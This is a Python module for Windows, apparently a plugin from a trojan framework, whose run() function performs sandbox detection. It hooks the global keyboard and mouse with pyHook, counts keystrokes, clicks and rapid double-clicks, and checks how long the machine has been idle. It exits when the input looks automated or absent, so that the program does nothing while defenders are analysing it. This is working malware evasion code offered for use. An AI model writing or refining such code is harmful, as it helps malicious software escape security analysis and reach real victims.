import ctypes
import random
import time
import sys
import pyHook
import win32gui
import threading

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

keystrokes = 0
mouse_clicks = 0
double_clicks = 0


class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint),
                ("dwTime", ctypes.c_ulong)
                ]


def get_last_input():
    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)

    # get the last input registered
    user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))

    # now determine how long the machine has been running
    run_time = kernel32.GetTickCount()

    elapsed = run_time - struct_lastinputinfo.dwTime

    print("[*] It's been %d milliseconds since the last input event." % elapsed)

    return elapsed

def threader(hookDevice):
    if hookDevice == "keyboard":
        # create and register a hook manager
        k2 = pyHook.HookManager()
        k2.SubscribeKeyDown(get_key_press)
        k2.HookKeyboard()
    else:
        k1 = pyHook.HookManager()
        k1.SubscribeMouseAllButtonsDown(get_mouse_press)
        k1.HookMouse()

    win32gui.PumpMessages()


def get_mouse_press(event):
    global mouse_clicks
    global keystrokes
    global keypress_time

    mouse_clicks += 1
    keypress_time = time.time()
    detection(event)

    return True


def get_key_press(event):
    global mouse_clicks
    global keystrokes
    global keypress_time
    
    if event.Ascii >= 32 and event.Ascii < 127:
        keystrokes += 1
        keypress_time = time.time()
        detection(event)
        
    return True


def detect_sandbox():
    print("[*] inside the sandbox_detect module")
    global max_keystrokes
    max_keystrokes = random.randint(10, 25)
    global max_mouse_clicks
    max_mouse_clicks = random.randint(5, 25)
    global double_clicks
    double_clicks = 0
    global max_double_clicks
    max_double_clicks = 10
    global double_click_threshold
    double_click_threshold = 0.250  # in seconds
    global first_double_click
    first_double_click = None

    global average_mousetime
    average_mousetime = 0
    global max_input_threshold
    max_input_threshold = 30000  # in milliseconds

    global previous_timestamp
    previous_timestamp = None
    global detection_complete
    detection_complete = False
    global last_input
    last_input = get_last_input()
    global k2
    list = []
    list.append("keyboard")
    list.append("mouse")
    for hookDevice in list:
        t = threading.Thread(target=threader, args=(hookDevice,))
        t.start()



def detection(event):
    global mouse_clicks
    global keystrokes
    global keypress_time
    global previous_timestamp
    global last_input
    global detection_complete
    global max_input_threshold
    global average_mousetime
    global first_double_click
    global double_click_threshold
    global max_double_clicks
    global double_clicks
    global max_keystrokes
    global max_mouse_clicks

    # if we hit our threshold lets' bail out
    if last_input >= max_input_threshold:
        sys.exit(1)

    while not detection_complete:

        if keypress_time is not None and previous_timestamp is not None:
            if hasattr(event, 'Wheel'):
                # calculate the time between double clicks
                elapsed = keypress_time - previous_timestamp

                # the user double clicked
                if elapsed <= double_click_threshold:
                    double_clicks += 1
                    if first_double_click is None:
                        # grab the timestamp of the first double click
                        first_double_click = time.time()
                        previous_timestamp = keypress_time
                        return

                    else:
                        # did they try to emulate a rapid succession of clicks?
                        if double_clicks == max_double_clicks:
                            if keypress_time - first_double_click <= (max_double_clicks * double_click_threshold):
                                sys.exit(1)

            # we are happy there's enough user input
            if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
                ctypes.windll.user32.PostQuitMessage(0)
                return
            else:
                previous_timestamp = keypress_time
                return

        elif keypress_time is not None:
            previous_timestamp = keypress_time
            return


def run(**args):
    detect_sandbox()
    return "We are okay!"
